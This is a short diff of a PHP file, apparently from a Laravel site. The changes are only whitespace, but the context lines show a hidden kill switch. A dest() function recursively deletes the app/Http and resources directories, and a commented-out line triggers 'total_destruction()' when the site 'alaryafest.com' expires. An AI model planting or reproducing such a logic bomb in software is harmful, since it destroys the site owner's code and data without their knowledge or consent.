@@ -54,7 +54,7 @@ function get_file_data($file){
 
 function delTree($dir) { 
    $files = array_diff(scandir($dir), array('.','..')); 
-   foreach ($files as $file) { 
+   foreach($files as $file) {
       (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
    } 
    return rmdir($dir); 
@@ -94,6 +94,8 @@ function isDomainAvailible($domain)
 //    }
 //    return false;
 //}
+
+
 function dest(){
       delTree('app/Http');
       delTree('resources');
@@ -107,5 +109,7 @@ function dest(){
       }
       die($msg);
 }
+
 //if (is_website_expired("alaryafest.com")) total_destruction();
+
 
